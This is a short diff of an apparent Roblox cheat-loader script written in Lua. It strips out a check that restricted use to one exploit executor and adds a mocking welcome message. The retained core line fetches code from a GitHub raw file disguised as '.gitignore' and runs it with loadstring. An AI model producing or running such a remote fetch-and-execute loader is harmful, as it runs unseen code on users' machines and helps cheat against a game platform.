@@ -1,11 +1,5 @@
 repeat wait() until game:IsLoaded()
 
 
-local pl = game.Players.LocalPlayer
-
-if is_synapse_function then
-	print("exploit = synapse")
+	print("welcome, i removed the shitty identity check so u can use jj sploit now lol")
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Skrapisismyscript/no-bruh/main/.gitignore", true))()
-else
-	pl:Kick("Exploit Not supported!!!")
-end
